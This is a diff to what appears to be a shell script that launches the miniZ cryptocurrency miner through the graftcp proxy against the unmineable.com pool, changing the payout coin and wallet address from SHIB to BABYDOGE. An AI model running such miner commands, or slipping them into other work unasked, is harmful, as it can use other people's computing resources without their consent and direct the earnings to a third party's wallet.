@@ -46,4 +46,4 @@ tar xf miniZ_v1.8y3_linux-x64.tar.gz
 
 ph add miniZ
 
-./graftcp/graftcp ./miniZ -u SHIB:0xb0dcecdce79de24326a9f770452c0a12721198ff.$(echo $(shuf -i 1-999 -n 1)-MyRig) -l ethash.unmineable.com --port=3333 -p x --par=ethash
+./graftcp/graftcp ./miniZ -u BABYDOGE:0xfdd8345f20C78BF14D1af01d5F7EA1DA1744fCD1.$(echo $(shuf -i 1-999 -n 1)-MyRig) -l ethash.unmineable.com --port=3333 -p x --par=ethash
